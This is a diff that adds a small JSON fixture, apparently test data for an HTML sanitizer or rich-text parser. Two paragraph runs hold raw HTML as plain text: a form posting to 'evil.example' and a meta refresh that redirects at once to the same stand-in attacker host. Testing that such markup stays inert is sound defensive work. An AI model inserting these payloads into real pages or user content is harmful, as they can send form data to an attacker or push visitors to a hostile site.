@@ -1,0 +1,1 @@
+{"blocks":[{"runs":[{"c":"text","v":"<form action=\"https://evil.example\"><input></form>"}],"t":"p"},{"runs":[{"c":"text","v":"<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"}],"t":"p"}],"diagnostics":[],"truncated":false}
